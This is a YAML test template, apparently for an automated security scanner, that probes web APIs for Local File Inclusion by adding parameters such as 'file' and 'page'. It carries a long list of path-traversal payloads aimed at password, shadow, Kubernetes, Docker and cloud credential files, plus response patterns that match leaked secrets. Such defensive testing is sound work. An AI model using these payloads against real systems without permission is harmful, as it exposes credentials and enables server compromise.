id: FILE_INCLUSION_NEW_PARAM
info:
  name: "LFI by adding new parameter"
  description: "This test evaluates the vulnerability of a web application to Local File Inclusion by introducing new parameters for potential file path manipulation" 
  details: >
            "Assesses the vulnerability of a web application to Local File Inclusion by introducing additional parameters for potential file path manipulation."
            "This test aims to identify any weaknesses that may allow an attacker to access sensitive files, leading to unauthorized data disclosure, server compromise, and potential execution of malicious code. It helps ensure the application's security and protect against LFI attacks"
  impact: "Successful exploitation allows an attacker to read arbitrary files on a web server, potentially leading to unauthorized access, information disclosure, server compromise, and execution of malicious code."
  category:
    name: LFI
    shortName: Local File Inclusion
    displayName: Local File Inclusion (LFI)
  subCategory: FILE_INCLUSION_NEW_PARAM
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
    - "https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
  cwe:
    - CWE-98
    - CWE-22
  cve:
    - CVE-2021-39433
    - CVE-2023-22973

api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - fail
      - invalid
  response_headers:
    for_one:
      key:
        eq: content-type
      value:
        regex: json
  method:
    contains_either:
      - "GET"

wordLists:
  filePaths: 
    - /etc/passwd
    - /etc/npasswd
    - ..//etc/passwd
    - ../..//etc/passwd
    - ../../..//etc/passwd
    - ../../../..//etc/passwd
    - ../../../../..//etc/passwd
    - ../../../../../..//etc/passwd
    - ..%2f/etc/passwd
    - ..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f..%2f/etc/passwd
    - ..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
    - ..\/etc/passwd
    - ..\..\/etc/passwd
    - ..\..\..\/etc/passwd
    - ..\..\..\..\/etc/passwd
    - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/..//etc/passwd
    - 0x2e0x2e//etc/passwd
    - 0x2e0x2e/0x2e0x2e//etc/passwd
    - ..0x2f/etc/passwd
    - ..0x2f..0x2f/etc/passwd
    - ..0x2f..0x2f..0x2f/etc/passwd
    - ..///etc/passwd
    - ..//..///etc/passwd
    - ..//..//..///etc/passwd
    - .\\..\\/etc/passwd
    - .\\..\\.\\..\\/etc/passwd
    - ../../../../../../../../../../../../etc/passwd%00
    - /var/lib/docker/containers/%2e%2e/%2e%2e/%2e%2e/etc/passwd
    - ..%252f..%252f..%252fvar%252flib%252fdocker%252fcontainers
    - ..%5c..%5c..%5cC:%5cWindows%5cMicrosoft.NET%5cFramework%5cv4.0.30319%5cConfig%5cmachine.config
    - ..//..//..//proc/self/environ
    - ..%c0%afdocker.sock
    - ../../../../../../../../../../../../etc/shadow%00
    - ../../../../../../../../../../../../root/.bash_history%00
    - ..//..//..//etc/kubernetes/admin.conf
    - /var/lib/docker/containers
    - /var/lib/docker/containers/*/config.v2.json
    - /var/lib/docker/containers/*/hostconfig.json
    - /root/.docker/config.json
    - /var/run/docker.sock
    - /var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token
    - /etc/kubernetes/admin.conf
    - /root/.kube/config
    - /proc/self/environ
    - /proc/self/cmdline
    - /sys/class/net/eth0/address
    - /etc/resolv.conf
    - /etc/hostname
    - /var/log/docker.log
    - /var/log/kube-apiserver.log
    - C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\machine.config
    - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
    - C:\inetpub\wwwroot\web.config
    - C:\Program Files\dotnet\shared\Microsoft.NETCore.App\*\dotnet.exe
    - C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
    - C:\Windows\System32\drivers\etc\hosts
    - C:\Users\*\AppData\Local\Temp\*.dll
    - C:\Windows\System32\inetsrv\config\applicationHost.config
    - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\
    - C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\ASP.NET\Temporary Internet Files\

execute:
  type: single
  requests:
    - req:
      - add_query_param:
          file: ${filePaths}
      - add_query_param:
          files: ${filePaths}
      - add_query_param:
          filePath: ${filePaths}
      - add_query_param:
          file_path: ${filePaths}
      - add_query_param:
          previewFilePath: ${filePaths}
      - add_query_param:
          controller: ${filePaths}
      - add_query_param:
          filename: ${filePaths}
      - add_query_param:
          page: ${filePaths}
      - add_query_param:
          sub_page: ${filePaths}
      - add_query_param:
          href: ${filePaths}
      - add_query_param:
          fn: ${filePaths}
      - add_query_param:
          module: ${filePaths}

validate:
  response_payload:
    contains_either:
      - "root:x:0:0:"     
      - "daemon:x:"               
      - "/bin/bash"              
      - "/usr/sbin/nologin"      
      - "root:$6$"               
      - "PATH="                 
      - "LANG="                  
      - "SHELL="                
      - "docker_version"          
      - "apiVersion: v1"          
      - "kind: Pod"              
      - "kubernetes-admin@"       
      - "client-certificate-data"             
      - "Entrypoint"             
      - "shosts.equiv"           
      - "AuthorizedKeysFile"     
      - "/var/log/auth.log"              
      - "<configuration>"         
      - "<connectionStrings>"     
      - "Data Source="            
      - "Trusted_Connection="    
      - "<appSettings>"           
      - "<system.web>"           
      - "localhost:8080"          
      - "IIS://localhost/"              
      - "<authorization>"        
      - "<authentication mode="   
      - "RequestFiltering"        
      - "AllowUnlisted="         
      - "<identity impersonate=" 
      - "ASP.NET_SessionId"       
      - "-----BEGIN RSA PRIVATE KEY-----"
      - "-----BEGIN OPENSSH PRIVATE KEY-----"
      - "-----BEGIN CERTIFICATE-----"
      - "aws_secret_access_key="
      - "aws_access_key_id="
      - "access_key_id:"
      - "client_secret:"
      - "session_id="
      - "Bearer "                
      - "Authorization: Basic"  
      - "root_password"          
      - "db_password"           
      - "id_rsa"                 
      - "PRIVATE KEY"           
      - "BEGIN PGP PRIVATE KEY" 
      - "127.0.0.1:5000" 
      - "Listen 80" 
      - "DocumentRoot"        
      - "ServerName"             
      - "worker_processes"      
      - "server_name"          
      - "/etc/nginx/nginx.conf"   
      - "error_log"               
      - "/var/lib/etcd"          
      - "admin_password"         
    length:
      gt: 0
    not_contains:
      - <html>
      - </html>